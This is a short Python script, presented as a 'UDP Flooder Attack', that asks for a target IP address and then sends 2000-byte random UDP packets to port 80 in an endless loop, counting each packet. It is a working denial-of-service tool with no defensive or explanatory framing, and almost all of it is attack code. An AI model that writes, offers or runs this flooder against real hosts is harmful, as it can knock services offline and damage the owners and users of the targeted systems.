from datetime import *
import socket
import random
import os
import sys

os.system("clear")


print("""\033[32m
                     ...::...
            ..   .:::^^^^^^^^:::.   ..
          !PJ  .::.::....: ..^:.:^.  J5~
       !!Y&Y  :^:.:. .: .: .. ^^::::  Y&Y!~
      7B?BJ..^. .^:::^:7JYY:^:.^^  .^ :JGJG!
     ~BJ75J.^   :.  :: 7!YB...  ^:  .^.J57JG^
    JYBPP?.^..::^   ^.  .7.  :  .^.:..:.?PPGJ?
    BYG5J^:.   ^::::~:::77.::^:::^^   ::^J5GJG
   .B5?PP.^    ^   .^ ..??.. :.  .^    ^.5P7YB
   7GGB5..:   .:   .^   ..   :.   ^.   :..PBGP7
  .P7&J?:::...:^.. :^.^:J5^^::....^:...:::?J&7G.
   B?JJB ::...:^.:~7YB? 7J 7#Y~::.^:...:: GJJJB.
   ?#~#J .:   .:~##&&&^ ~7 ^&&#BBY^.   :. J#~#J
   ~BBB!^ :    :5&&&&&! ?P !&&&&&&!    ^ ^7BBG~
   Y!G5?5 :.  .~#&&&&&5 YB 5&&&&&&7   .: 5?PG!5
   7#?7PG  ^...~&&&&&&&!YB7&&&&&&&?...:  G57?#7
    Y&JPB!^.^  J&&&&&&&#B##&&&&&&&5  ^ ^7B5J&J
    :5B#&!P..:.P&&&&&&&&&&&&&&&&&&G.: :G!&#BY.
     ?5JG7P5  :B&&&&&&&&&&&&&&&&&&B:  5P7GJ5?
     .5#PJ?#77^#&&&&&&&&&&&&&&&&&&#~77#7JPBY.
       ~PGGB#JG#&&&&&&&&&&&&&&&&&&&BJ#BGGP~
        !YYJYJ!G&&&&&&&&&&&&&&&&&&G7JYJYY!
         ^YGGGGPP5#&&&&&&&&&&&&G5PPGGGGY~
           :7?77JP#&&&&&&&&&&&&#5J77?7:
            .75GGB&&&&&&&&&&&&&BPGG57.
                 ?&&&&&&&&&&&&&5
                 7#&&&&&&&&&&&&P                   """)

print("-" * 50)
print("     Welcome to the UDP Flooder Attack")
print("-" * 50)
now = datetime.now()
today = date.today()
d1 = today.strftime("%d/%m/%Y")
target = input("Target IP : ")
print("*" * 50)
print("Attacking to : " + target + ":80 -",
      d1 + "   " + now.strftime("%H:%M"))
print("*" * 50)
input("Press Any Key To Continue . . .")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
byte = random._urandom(2000)

attack_num = 0
while True:
    try:
        s.sendto(byte, (target, 80))
        attack_num += 1
        print("Sent : " + str(attack_num) + " Packets")
    except:
        s.close()
        sys.exit("Attack stopped, Flooding Done!")
